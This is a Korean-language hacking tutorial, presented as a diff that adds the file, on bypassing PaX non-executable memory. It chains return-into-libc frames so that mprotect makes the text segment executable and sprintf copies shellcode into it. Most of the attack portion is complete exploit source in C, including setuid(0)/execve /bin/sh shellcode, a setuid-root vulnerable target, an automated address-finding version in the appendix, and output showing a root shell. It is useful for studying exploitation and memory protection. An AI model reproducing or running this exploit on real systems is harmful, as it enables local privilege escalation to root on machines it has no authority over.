@@ -1,0 +1,669 @@
+           Stack buffer overflow기법을 이용하여 Text영역에 쉘코드를 올려놓고 실행시키기
+             
+                                     Mutacker in (주서식지: Null@Root & 항공대 네트웍 보안연구실 )
+                                                  mutacker@null2root.org, 
+                                                  mutacker@mail.hangkong.ac.kr
+                                                  (http://mutacker.null2root.org)
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+/////// 1. 글 쓰기에 앞서
+
+먼저 글 쓰기에 앞서 항상 저를 도와주시는 많은 분들에게 감사드린다.
+해킹의 새로운 기술이나 기법을 발견하고 생각해 내는 작업은 분명 혼자서 해나가기에는 지치고 힘이 들 때가 많다. 
+하지만, 항상 곁에서 지켜봐주고, 도와주고 조언을 아끼지 않는 수많은 분들이 있기에 가능한 일이 아닌가 싶다.
+다시 한번 그 분들에게 감사를 표한다.
+
+특히, 우리의 "오~ 모나리자(O~ MuNaRiSe)"팀원(?)들께 감사드립니다. - 정체불명의 Null@Root 멤버들
+
+이 문서는 다양한 방법의 소개에 해당하는 것으로 버퍼오버플로어 기법이 어디까지 응용이 가능한지 보여주기 위함일 
+뿐이다.
+
+본 문서에 대한 판권은 없는 것으로 하며, 단지 편집만은 금했으면 한다.
+틀린 부분이나 오탈자 등은 본인에게 메일이나 주서식지(irc.null2root.org)에서 알려주시면, 
+고맙겠습니다.
+단지 본 문서에서는 방향만을 제시할 뿐 실제 특정 어플리케이션에 관련된 exploit을 제공하지는 않는다.
+아무쪼록, 이 글이 한국 보안 전문가들이나 열심히 노력하는(? 뚫기위해가 아닌 기술발전을 위해) 해커들에게,
+그리고 프로그램을 개발하는 개발자들에게 조그마한 도움이 되었으면 하는 바램에서 글을 적어본다.
+
+이 문서의 최고 공개지는 http://mutacker.null2root.org이며, 최초 문서 개제 장소는 http://www.khdp.org이다.
+만일 다른 곳에 본 문서를 개제할 경우에는 그 출처를 정확히 밝혀주었으면 하는 바램이다.
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 2. 소개
+
++----------------------------------------------------------------------------------------+
+|  Stack buffer overflow기법을 이용하여 Text영역에 쉘코드를 올려놓고 실행시킬 수 있을까? |
++----------------------------------------------------------------------------------------+
+
+처음 버퍼오버플로어 기법이 소개된 이후로 다양한 기법들이 선보였었고, 이러한 것들을 응용하는 방법들이 
+많이 소개가 이루어 졌었다.
+이 글에서는 이전에 다루어졌었던 기본적인 버퍼오버플로어 기법에 대해 충분히 숙지하고 있다는 가정하에서
+작성되어졌으며, 이를 응용하여 보다 나은 또 다른 기법이 나올 수 있었으면 하는 바램에서 글을 작성하게 되었다.
+
+본 글은 기존에 다루어졌던 스택버퍼오버플로어(stack buffer overflow) 기법의 응용편쯤 된다고 할 수 있겠다.
+스택의 기본 그림이나, 버퍼오버플로어가 발생하는 기본 과정들은 다른 문서를 통해 숙지해주었으면 싶다.
+본 문서는 Phrack-58-4번 내용을 참고하여 작성되어졌다. 즉, Phrack-58-4번 내용과 중복되는 내용은 가급적
+설명을 하지 않고 생략하도록 할 것이다.
+
+이 글에서 다루는 내용은 Stack buffer overflow기법을 이용하여 Text영역에 쉘코드를 올려놓고 실행시키기이다.
+
+-- 설정 환경
+(1) 시스템과 운영체제
+[mutacker@localhost makepaper]$ uname -a
+Linux localhost.localdomain 2.4.20 #1 SMP Mon Mar 24 21:05:39 KST 2003 i686 unknown
+
+(2) Patch 설정 환경
+http://pageexec.virtualave.net 의 PaX patch 적용
+ [*] Paging based non-executable pages
+ [ ] Segmentation based non-executable pages
+ [ ]   Emulate trampolines
+ [ ]   Restrict mprotect()
+ [ ]     Disallow ELF text relocations
+ [ ] Address Space Layout Randomization
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 3. 문제 설정
+
+#include <stdio.h>
+int main(int argc, char* argv[]) {
+    char buf[20];
+
+    strcpy(buf, argv[1]);
+}
+
+직관적으로 위의 문제는 스택상에서 버퍼오버가 발생할 수 있음을 알 수 있다.
+
+이제 우리는 무엇을 할까?
+첫번째 생각할 수 있는 것은 argv[1]에 쉘코드를 주입하고 return address를 쉘코드 영역으로 지정함으로써
+쉘코드를 쉽게 띄울 수 있을 것이라 예상할 수 있다.
+두번째는 EGG 쉘을 이용하여 쉘코드를 포함한 EGG환경변수를 환경변수 영역에 넣어두고, return address를 
+이곳으로 지정함으로써, 쉘코드를 쉽게 띄울 수 있을것이라 예상할 수 있다.
+세번째, Omega project에 의한 방법으로 쉘을 띄울 수 있을 것이라 예상된다.
+
+하지만, 불행하게도 우리는 이 방법을 이용할 수가 없다.
+일단 첫번째, 두번째의 경우 PaX patch중 [*] Paging based non-executable pages 옵션을 설정하고,
+컴파일을 하였을 경우 스택이나 힙, 데이터 등과 같은 일반적인 변수들이 생기는 영역에서의 기계어 코드의
+실행을 막아버리기 때문에, 이들 쉘코드는 실행이 되지를 않는다.
+세번째의 경우, system()함수를 호출하기 전에 setuid(0); 이나 setreuid(0, 0);을 호출해야 하는데,
+불행하게도 4바이트의 zero 값을 주입한다는 것이 보통 쉬운 문제가 아니다.
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 3. 환경 분석
+
+Stack buffer overflow기법을 이용하여 Text영역에 쉘코드를 올려놓고 실행시킬 수 있을까?
+아니면, 그 보호 매커니즘을 깨버릴 수는 없을까? 왜, 데이터 영역에서 실행이 되지 않는 것일까?
+
+먼저 proc상에 존재하는 현재 프로세스의 메모리 상황을 살펴보자.
+
+mutacker> cat /proc/self/maps
+08048000-0804c000 r-xp 00000000 03:01 34733      /bin/cat              <=== Text section
+0804c000-0804d000 rw-p 00003000 03:01 34733      /bin/cat              <=== Data section
+0804d000-0804f000 rw-p 00000000 00:00 0
+40000000-40016000 r-xp 00000000 03:01 44966      /lib/ld-2.2.2.so
+40016000-40017000 rw-p 00015000 03:01 44966      /lib/ld-2.2.2.so
+40017000-40018000 rw-p 00000000 00:00 0
+40022000-40148000 r-xp 00000000 03:01 65288      /lib/i686/libc-2.2.2.so
+40148000-4014e000 rw-p 00125000 03:01 65288      /lib/i686/libc-2.2.2.so
+4014e000-40152000 rw-p 00000000 00:00 0
+bfffe000-c0000000 rw-p fffff000 00:00 0                                <=== Stack 
+
+위의 상황을 살펴보면 명령어 코드가 존재하는 구간은 r-xp으로, 일반 데이터 영역은 rw-p으로 설정되어 
+있음을 알 수 있다.
+
+아래는 PaX patch를 하지 않은 시스템상의 상황을 보여주고 있다.
+[mutacker@localhost makepaper]$ cat /proc/self/maps
+08048000-0804c000 r-xp 00000000 03:05 33058      /bin/cat
+0804c000-0804d000 rw-p 00003000 03:05 33058      /bin/cat
+0804d000-0804f000 rwxp 00000000 00:00 0                                  <==== 이 부분에 주의
+40000000-40016000 r-xp 00000000 03:05 5077       /lib/ld-2.2.2.so
+40016000-40017000 rw-p 00015000 03:05 5077       /lib/ld-2.2.2.so
+40017000-40018000 rw-p 00000000 00:00 0
+4002e000-40154000 r-xp 00000000 03:05 5071       /lib/i686/libc-2.2.2.so
+40154000-4015a000 rw-p 00125000 03:05 5071       /lib/i686/libc-2.2.2.so
+4015a000-4015e000 rw-p 00000000 00:00 0
+bfffe000-c0000000 rwxp fffff000 00:00 0                                  <==== 이 부분에 주의
+
+윗쪽과 비교해보면 스택상에서도 명령어 코드가 실행이 가능한 상태로 존재함을 알 수 있다.
+
+자! 그러면 실행가능 구간이 아닌 곳을 실행가능 하도록 만들어서 그곳에 있는 쉘코드를 실행시켜보도록 하자.
+여기에서는 재미를 위해 그 실행구간을 명령어가 존재하는 구간으로 잡도록 할 것이다.
+
+전쟁을 하기 위해서는 무기가 풀요하듯 우리도 무언가 한가지 준비를 해야하겠다.
+일단 하나의 프로세스가 생겨날 때, 어떻게 프로세스는 코드영역을 읽기전용, 실행구간으로 설정하는 것일까?
+
+이것을 위해 strace를 이용하여 살펴보도록 하자.
+[mutacker@localhost makepaper]$ strace uname -a
+execve("/bin/uname", ["uname", "-a"], [/* 29 vars */]) = 0
+uname({sys="Linux", node="localhost.localdomain", ...}) = 0
+brk(0)                                  = 0x804a398
+old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40017000
+open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=89989, ...}) = 0
+old_mmap(NULL, 89989, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40018000
+close(3)                                = 0
+open("/lib/i686/libc.so.6", O_RDONLY)   = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\302"..., 1024) = 1024
+fstat64(3, {st_mode=S_IFREG|0755, st_size=5634864, ...}) = 0
+old_mmap(NULL, 1242920, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x4002e000
+mprotect(0x40154000, 38696, PROT_NONE)  = 0
+old_mmap(0x40154000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x125000) = 0x
+40154000
+old_mmap(0x4015a000, 14120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1,
+ 0) = 0x4015a000
+close(3)                                = 0
+munmap(0x40018000, 89989)               = 0
+getpid()                                = 9026
+brk(0)                                  = 0x804a398
+brk(0x804a3c0)                          = 0x804a3c0
+brk(0x804b000)                          = 0x804b000
+uname({sys="Linux", node="localhost.localdomain", ...}) = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40018000
+ioctl(1, TCGETS, {B9600 opost isig icanon echo ...}) = 0
+write(1, "Linux localhost.localdomain 2.4."..., 84Linux localhost.localdomain 2.4.20 #1 SM
+P Mon Mar 24 21:05:39 KST 2003 i686 unknown
+) = 84
+munmap(0x40018000, 4096)                = 0
+_exit(0)                                = ?
+
+위에서 우리는 무언가 무기하나가 보임을 알 수 있다.
+그것은 mmap이라는 시스템콜과 mprotect라는 시스템콜을 살펴볼 수 있다. 
+이 글에서는 mprotect를 이용하도록 하겠다. 왜 그걸 사용하냐고 물어본다면.. 경험학상 이라고 밖에는 ^^;
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 4. 문제 풀이
+
+자세한 사항은 아래의 소스를 통해 확인하기 바란다. 개략적인 설명만을 이곳에서 하도록 하겠다.
+
+전체적인 흐름은 이러하다. 
+
+1. 환경변수 영역에 phrack 58-4에서 소개하는 형태의 fake-frame을 구성한다.
+   이때 주의할 사항은 mprotect등과 같은 매개변수에 zero값이 자주 출몰한다는 것이다.
+   이를 해결하기 위해 envp[n] = "";을 넣는다. 단 n은 자신이 넣고자 하는 위치.
+   즉, envp[10]="";envp[11]="";envp[12]=""; 이와같이 하면 연속 3바이트가 0으로 환경변수영역에
+   설정되어진다.
+   이때 주의할 사항은 4바이트를 0으로 설정하기 위해서는 세번만 저걸 수행하라는 것이다.
+   다른 환경변수가 설정되면서 가장 마지막에 0이 자동으로 설정되기 때문에 이것까지 고려하여야 한다.
+2. mprtect를 통해 해당 영역을 읽고, 쓰기, 실행 가능 구간으로 변경하라.
+   여기에서는 0x08048000영역부터 4096(0x1000, 1 page size)만큼의 크기를 mprotect를 이용하여 rwx형태로
+   변경할 것이다.
+   mprotect(0x08048000, 0x00001000, 0x00000007);
+   이와 같이 하면 해당 영역이 쓰기까지 가능한 구간으로 설정되어진다.
+   주! 소스를 보면 0xA5가 자주 보이는데, 이 자리는 모두 0으로 대체되는 곳이다.
+   0xA5자리가 위의 1에서 설명한 envp[n]="";에 해당하는 자리이다.
+3. sprintf를 이용하여 쉘코드를 자신이 원하는 곳으로 이동시키라.
+   (여기에서는 재미삼아 0x08048000영역으로 복사를 하는 것이고, 
+    만일 그냥 스택을 실행가능구간으로 변경해 버려도 된다. 
+    그럴경우에는 sprintf까지 동원되는 일이 없어도될 것이다. 
+    단지 가능성만을 보이기 위함이다.)
+
+   쉘코드를 환경변수에 넣어두고, 이들 값을 복사하기 위해 strcpy나 memcpy계열을 사용하면 좋겠지만, 
+   대부분이 주소란에 0x0a에 해당해 argv[]나 fgets등의 함수에 제약을 주는 관계로 이를 회피학 위해
+   sprintf를 사용한다.
+4. 리턴 어드레스의 위치를 0x08048000으로 설정
+
+위의 이 많은 이야기들을 모두 실행에 옮기기 위해서는 phrack 58-4번에서 소개하고 있는 frame-chain을 
+구성하는 방법이 가장 쉬운 방법이 되겠다. frame-chain에 대한 설명은 이곳에서 하지 않도록 하겠다.
+
+이를 통해 구성한 스택 프레임은 다음과 같다.
+argv입력값 : [20byte 쓰레기][fake_ebp1 <= fake_ebp2의 위치][leaveret]  
+환경변수 영역구성 : 
+[fake_ebp2 <=fake_ebp3의 위치][mprotect][leaveret][0x08048000][0x00001000][0x00000007]
+[fake_ebp3 <=아무값이나 상관없음, chain의 끝][sprintf][0x08048000][0x08048000][shellcode 위치]
+
+<-------------------------------------------------------------------------->
+mutacker ~/BreakPaX/newtest> uname -a
+Linux kof 2.4.20-PaX #2 SMP Sat Feb 22 06:59:22 KST 2003 i686 unknown
+
+mutacker ~/BreakPaX/newtest> cat vul.c
+#include <stdio.h>
+
+int main(int argc, char* argv[]) {
+    char buf[20];
+
+    strcpy(buf, argv[1]);
+}
+
+mutacker ~/BreakPaX/newtest> ls -al vul
+-rwsr-xr-x    1 root     root        13626 Mar  5 20:46 vul
+
+mutacker ~/BreakPaX/newtest> cat vulex.c
+// 아래에 나오는 모든 A5는 0으로 대체시킬 문자이다.
+#include <stdio.h>
+#include <sys/mman.h>
+
+#define VUL_PROG      "/home/mutacker/BreakPaX/newtest/vul"
+#define DUMMY_COUNT   40   //
+#define ENV_ALIGN     4
+
+#define MPROTECT_ADDR 0x40012bA5   //<=== 요기 0하고
+#define SPRINTF_ADDR  0x40081654
+#define LIB_SHELL_AREA 0x401480A5  //<=== 요기 0하고
+#define LEAVERET 0x80484dc
+#define SHELLCODE 0xbffffdd8
+
+char hellcode[] =
+       "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"
+       "\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46"
+       "\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31"
+       "\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+struct three_arg {
+        unsigned int new_ebp;
+        unsigned int func;
+        unsigned int leave_ret;
+        unsigned int param1;
+        unsigned int param2;
+        unsigned int param3;
+};
+
+struct two_arg {
+        unsigned int new_ebp;
+        unsigned int func;
+        unsigned int leave_ret;
+        unsigned int param1;
+        unsigned int param2;
+};
+
+struct go_env_area {
+        struct three_arg mu_mprotect;
+        struct two_arg mu_sprintf;
+        char shellbuf[511];
+        char dummy[ENV_ALIGN];
+};
+
+struct overflowst {
+        char dummy[DUMMY_COUNT];
+        unsigned int ebp;
+        unsigned int leave_ret;
+};
+
+char *name[100];
+char *env[100];
+int namecnt=0;
+int envcnt=0;
+
+void InsertEnv(char* str) {
+    env[envcnt] = str;
+    envcnt++;
+}
+
+void InsertEnvFinish() {
+    env[envcnt] = NULL;
+    envcnt++;
+}
+
+main() {
+    struct overflowst  argument;
+
+    struct go_env_area my_env;
+    char* base = (char*) &my_env;
+    char* find_a5;
+    int loopcnt;
+
+    printf("mprotect : %p, define MPROTECT = 0x%x\n", mprotect, MPROTECT_ADDR);
+    my_env.mu_mprotect.new_ebp = 0xbffffdc4;
+    my_env.mu_mprotect.func = MPROTECT_ADDR;
+    my_env.mu_mprotect.leave_ret = LEAVERET;
+    my_env.mu_mprotect.param1 = LIB_SHELL_AREA;
+    my_env.mu_mprotect.param2 = 0xA5A510A5;
+    my_env.mu_mprotect.param3 = 0xA5A5A507;
+
+    my_env.mu_sprintf.new_ebp = 0xbffffdc4;
+    my_env.mu_sprintf.func = SPRINTF_ADDR;
+    my_env.mu_sprintf.leave_ret = LIB_SHELL_AREA;
+    my_env.mu_sprintf.param1 = LIB_SHELL_AREA;
+    my_env.mu_sprintf.param2 = SHELLCODE;
+
+    memset(my_env.dummy, 0x61, ENV_ALIGN);
+    memset(my_env.shellbuf, 0x90, 511);
+    strcpy(my_env.shellbuf+sizeof(my_env.shellbuf)-strlen(hellcode), hellcode);
+
+    find_a5 = base;
+    while(find_a5 != NULL) {
+        find_a5 = strchr(base, (char)0xa5);
+        if(find_a5 != NULL) *find_a5 = 0;
+        InsertEnv(base);
+        if(find_a5 != NULL) base = find_a5+1;
+    }
+
+    InsertEnvFinish();
+
+    memset(argument.dummy, 0x61, DUMMY_COUNT);
+    argument.ebp = 0xbffffdac;
+    argument.leave_ret = LEAVERET;
+
+    namecnt = 0;
+    name[namecnt++] = VUL_PROG;
+    printf("Starting : %s\n", name[namecnt-1]);
+    name[namecnt++] = (char*) &argument;
+    name[namecnt++] = NULL;
+
+    execve(VUL_PROG, name, env);
+    printf("Fail execve()\n");
+}
+
+mutacker ~/BreakPaX/newtest 11> ./vulex
+mprotect : 0x8048518, define MPROTECT = 0x40012ba5
+Starting : /home/mutacker/BreakPaX/newtest/vul
+sh-2.04# id
+uid=0(root) gid=500(mutacker) groups=500(mutacker)
+sh-2.04#
+<-------------------------------------------------------------------------->
+
+부록의 예는 mprotect와 sprintf, leaveret 함수의 주소를 자동으로 획득할 수 있도록 하느라, 
+코드가 상당히 지저분해져버렸다. 이를 좀 더 깔끔하게 정리하신 분은 저에게 메일로 보내주셨으면 한다. ^^;
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 5. 결론
+
+본 문서에서는 PaX와 같은 데이터영역에서의 쉘코드 실행이 불가능한 상황하에서 버퍼오버플로어가 
+발생하였을 경우에도 mprotect나 mmap등을 이용하여 쉘을 띄울 수 있음을 확인하였다.
+물론 PaX의 커널 패치에는 mprotect를 금지시키는 부분이 존재한다. 즉, 좀 더 안전한 환경을 
+위해서는 mprotect를 사용제한 시키는 환경을 꾸밀 것을 당부드리고 싶다. 
+
+이 문서의 내용은 패치를 하지 않았다 하더라도 동일하게 실행된다. 설정후 실험해 보길 바란다.
+
+물론 mprotect를 제한설정한다고 하더라도 또 다른 다양한 방법이 존재할 수가 있다.
+이것은 dlopen, dlsym의 호출을 이용하는 방법이다. 다음 문서에서는 이것에 대해 글을 올리도록 하겠다.
+
+이를 위해 재미난 문제를 마지막으로 본 글을 마무리 하겠다. 풀어보시기 바란다. 
+조건은 printf를 직접 호출하여 화면에 출력하는 것이 아니라는 것이다.
+printf를 chain으로 엮는 것이 아닌, code영역의 변형이 필요하다. ^^
+위에서 지적한 방법을 이용하여 풀어보면 재미 있을 것이라 본다. ^^
+
+<................................................>
+#include <stdio.h>
+
+int main(int argc, char* argv[]) {
+   char buf[20];
+
+   strcpy(buf, argv[1]);
+
+   printf("WowWow\n");
+
+   goto null2root;
+   printf("Execute me!!!\n");
+   exit(0);
+   null2root:
+   printf("^______^ \n\n");
+}
+
+아래와 같은 결과가 나오도록 실행시키시오. 
+<실행결과>
+
+WowWow
+^______^
+
+WowWow
+Execute me!!!
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 6. 참고문서
+
+1. The advanced return-into-lib(c) exploits : phrack 58-4
+2. PaX team - PaX // http://pageexec.virtualave.net
+3. 기타 수많은 bof글들 ^^
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 7. 부록
+
+mutacker ~/BreakPaX/khdp 22> ./m
+Usage: ./m <program name>
+program name must be full path!!!
+mutacker ~/BreakPaX/khdp 23> ./m vulunerbility
+Starting : vulunerbility
+sh-2.04# id
+uid=0(root) gid=500(mutacker) groups=500(mutacker)
+sh-2.04#
+
+//////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////
+// -- mprotect.h 파일
+//////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////
+unsigned long get_offset(char *vulfile, char* func_name);
+unsigned long get_leaveret(char *vulfile);
+
+char hellcode[] =
+       "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"
+       "\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46"
+       "\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31"
+       "\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+struct three_arg {
+        unsigned int new_ebp;
+        unsigned int func;
+        unsigned int leave_ret;
+        unsigned int param1;
+        unsigned int param2;
+        unsigned int param3;
+};
+
+struct two_arg {
+        unsigned int new_ebp;
+        unsigned int func;
+        unsigned int leave_ret;
+        unsigned int param1;
+        unsigned int param2;
+};
+
+struct go_env_area {
+        struct three_arg mu_mprotect;
+        struct two_arg mu_sprintf;
+        char shellbuf[64];
+};
+
+char *name[100];
+char *env[100];
+int namecnt=0;
+int envcnt=0;
+
+unsigned long zero2a5(unsigned long num) {
+    int cnt;
+    unsigned long ch;
+    char* ptr = (char*) &ch;
+
+    ch = num;
+    for(cnt=0; cnt < 4; cnt++) {
+        if (ptr[cnt] == 0) ptr[cnt] = 0xa5;
+    }
+    printf("0x%x\n", ch);
+    return ch;
+}
+
+void InsertEnv(char* str) {
+    env[envcnt] = str;
+    envcnt++;
+}
+
+void InsertEnvFinish() {
+    env[envcnt] = NULL;
+    envcnt++;
+}
+
+#define OBJDUMP "/usr/bin/objdump"
+#define GREP    "/bin/grep"
+#define AWK     "/bin/awk"
+#define LDD     "/usr/bin/ldd"
+#define LDLINUX "/lib/ld-linux.so.2"
+#define LIBC    "libc.so.6"
+#define TAIL    "/usr/bin/tail"
+
+unsigned long get_offset(char *vulfile, char* func_name) {
+    FILE* cmdpipe;
+    char command[1024];
+    char base[100];
+    char offset[100];
+    unsigned long base_addr;
+    unsigned long offset_addr;
+
+    char libraryfile[100];
+
+    memset(libraryfile, 0, 100);
+    memset(command, 0, 1024);
+
+    if (strcmp(func_name, "mprotect") == 0)
+          sprintf(libraryfile, LDLINUX);
+    else if (strcmp(func_name, "sprintf") == 0)
+          sprintf(libraryfile, "/lib/i686/%s", LIBC);
+    else { printf("function name not supported!!\n"); exit(0); }
+
+    sprintf(command, "%s -x %s | %s %s | %s '$6 == \"%s\" {print \"0x\"$1}'",
+            OBJDUMP, libraryfile, GREP, func_name, AWK, func_name);
+    cmdpipe = popen(command, "r");
+    fgets(base, 100, cmdpipe);
+    pclose(cmdpipe);
+    base_addr = strtol(base, NULL, 16);
+
+    if (strcmp(func_name, "mprotect") == 0) sprintf(libraryfile, LDLINUX);
+    else if (strcmp(func_name, "sprintf") == 0) sprintf(libraryfile, LIBC);
+    else { printf("function name not supported!!\n"); exit(0); }
+
+    memset(command, 0, 1024);
+    sprintf(command, "%s %s | %s '$1 == \"%s\" {print $4}'",
+                     LDD, vulfile, AWK, libraryfile);
+    cmdpipe = popen(command, "r");
+    fgets(offset, 100, cmdpipe);
+    pclose(cmdpipe);
+    offset[0] = ' ';
+    offset[11] = ' ';
+    offset_addr = strtol(offset, NULL, 16);
+
+    return(base_addr+offset_addr);
+}
+
+unsigned long get_leaveret(char *vulfile) {
+    FILE* cmdpipe;
+    char command[1024];
+    char addr[100];
+    unsigned long leaveret_addr;
+
+    memset(command, 0, 1024);
+
+    sprintf(command, "%s -d %s | %s leave | "
+                     "%s '$3 == \"leave\" {print \"0x\"$1}' | %s -n 1",
+                     OBJDUMP, vulfile, GREP, AWK, TAIL);
+    cmdpipe = popen(command, "r");
+    fgets(addr, 100, cmdpipe);
+    pclose(cmdpipe);
+    addr[10] = ' ';
+    leaveret_addr = strtol(addr, NULL, 16);
+
+    return(leaveret_addr);
+}
+
+//////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////
+// -- vulex.c 파일
+//////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////
+#include <stdio.h>
+#include <stdlib.h>
+#include <stddef.h>
+#include <dlfcn.h>
+#include <sys/mman.h>
+#include "mprotect.h"
+
+#define DUMMY_COUNT   40
+
+struct overflowst {
+        char dummy[DUMMY_COUNT];
+        unsigned int ebp;
+        unsigned int leave_ret;
+        unsigned int null;
+};
+
+unsigned long Var_mprotect;
+unsigned long Var_sprintf;
+unsigned long Var_shellarea;
+unsigned long Var_leaveret;
+unsigned long Var_shellcode;
+unsigned long Var_mprotect_newebp;
+
+main(int argc, char* argv[]) {
+    struct overflowst  argument;
+    struct go_env_area* p_env;
+    char* base;
+    char buf[1024];
+    char attack_prog[1024];
+    char* find_a5;
+    int loopcnt;
+
+    memset(buf, 0, sizeof(buf));
+    memset(attack_prog, 0, sizeof(attack_prog));
+
+    if (argc == 2) strcpy(attack_prog, argv[1]);
+    else {
+         printf("Usage: %s <program name>\n"
+                "program name must be full path!!!\n", argv[0]);
+         exit(0);
+    }
+
+    Var_mprotect = zero2a5(get_offset(attack_prog, "mprotect"));
+    Var_sprintf = zero2a5(get_offset(attack_prog, "sprintf"));
+    Var_shellarea = zero2a5(0x08048000);
+    Var_leaveret = zero2a5(get_leaveret(attack_prog));
+    Var_shellcode = zero2a5(0xbfffff98);
+
+    Var_mprotect_newebp = 4-(strlen(attack_prog)+1)%4; // prog dummy size
+    Var_mprotect_newebp += strlen(attack_prog)+1 + 4; // progname+null 4
+    Var_mprotect_newebp += sizeof(struct go_env_area);
+    Var_mprotect_newebp -= offsetof(struct go_env_area, mu_sprintf);
+    Var_mprotect_newebp = 0xc0000000 - Var_mprotect_newebp;
+
+////// 매개 변수 설정 부분
+    memset(argument.dummy, 0x61, DUMMY_COUNT);
+    argument.ebp = Var_mprotect_newebp-offsetof(struct go_env_area, mu_sprintf);
+    argument.leave_ret = Var_leaveret;
+    argument.null = 0;
+
+    namecnt = 0;
+    name[namecnt++] = attack_prog;
+    printf("Starting : %s\n", name[namecnt-1]);
+    name[namecnt++] = (char*) &argument;
+    name[namecnt++] = NULL;
+//////////////////////////////
+
+// 4의 배수로 만들기 위한 dummy][strlen(attack_prog)+1][4]
+
+////// 환경 변수 설정 부분
+    base = buf;
+    p_env = (struct go_env_area*) buf;
+
+    p_env->mu_mprotect.new_ebp = Var_mprotect_newebp;
+    p_env->mu_mprotect.func = Var_mprotect;
+    p_env->mu_mprotect.leave_ret = Var_leaveret;
+    p_env->mu_mprotect.param1 = Var_shellarea;
+    p_env->mu_mprotect.param2 = 0xA5A510A5;
+    p_env->mu_mprotect.param3 = 0xA5A5A507;
+
+    // sprintf_newebp는 실제 의미없음, 그 이후는 쉘코드로 넘어가 버리기 때문에..
+    // 따라서, 그 자리를 0xffffffff로 설정해도 무방함
+    p_env->mu_sprintf.new_ebp = 0xffffffff; //Var_mprotect_newebp;
+    p_env->mu_sprintf.func = Var_sprintf;
+    p_env->mu_sprintf.leave_ret = Var_shellarea;
+    p_env->mu_sprintf.param1 = Var_shellarea;
+    p_env->mu_sprintf.param2 = Var_shellcode;
+
+    memset(p_env->shellbuf, 0x90, sizeof(p_env->shellbuf));
+    strcpy(p_env->shellbuf+sizeof(p_env->shellbuf)-strlen(hellcode)-1, hellcode);
+
+    find_a5 = base;
+    while(find_a5 != NULL) {
+        find_a5 = (char*)strchr(base, (char)0xa5);
+        if(find_a5 != NULL) *find_a5 = 0;
+        InsertEnv(base);
+        if(find_a5 != NULL) base = find_a5+1;
+    }
+
+    for(loopcnt = 0; loopcnt < 4 - ((strlen(attack_prog)+1) % 4); loopcnt++)
+            InsertEnv("");
+
+//////////////////////////////
+    execve(attack_prog, name, env);
+    printf("Fail execve()\n");
+}
